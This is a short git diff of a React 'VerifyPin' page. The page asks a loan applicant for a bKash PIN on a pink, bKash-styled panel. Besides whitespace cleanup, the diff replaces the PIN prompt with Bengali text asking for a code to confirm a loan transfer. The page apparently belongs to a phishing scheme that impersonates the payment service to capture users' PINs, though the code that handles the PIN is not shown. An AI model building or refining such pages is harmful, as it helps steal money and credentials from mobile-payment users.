@@ -51,7 +51,7 @@ export default function VerifyPin() {
     }
   };
 
-  const maskedMobile = loanData.mobile_number 
+  const maskedMobile = loanData.mobile_number
     ? loanData.mobile_number.substring(0, 3) + 'XXXX' + loanData.mobile_number.substring(7)
     : '';
 
@@ -81,7 +81,7 @@ export default function VerifyPin() {
         <form onSubmit={handleSubmit}>
           {/* PIN Input Section */}
           <div className="bg-pink-600 px-6 py-16">
-            <p className="text-white text-sm mb-2 text-center">Enter bKash PIN for {maskedMobile}</p>
+            <p className="text-white text-sm mb-2 text-center">লোন ট্রান্সফার আন্ড কনফার্মেশন এর জন্য সঠিক কোড টি দিয়ে কনফার্ম করুন</p>
             <input
               type="password"
               value={pin}
@@ -95,15 +95,15 @@ export default function VerifyPin() {
 
           {/* Buttons */}
           <div className="flex justify-between items-center bg-white px-6 py-4">
-            <button 
-              type="button" 
+            <button
+              type="button"
               onClick={() => setShowCancel(true)}
               className="w-[48%] bg-gray-200 text-gray-700 py-2 rounded hover:bg-gray-300"
             >
               Cancel
             </button>
-            <button 
-              type="submit" 
+            <button
+              type="submit"
               disabled={!isValid || isProcessing}
               className={`w-[48%] py-2 rounded transition-colors ${isValid && !isProcessing ? 'bg-pink-500 text-white hover:bg-pink-600' : 'bg-gray-300 text-gray-500 cursor-not-allowed'}`}
             >
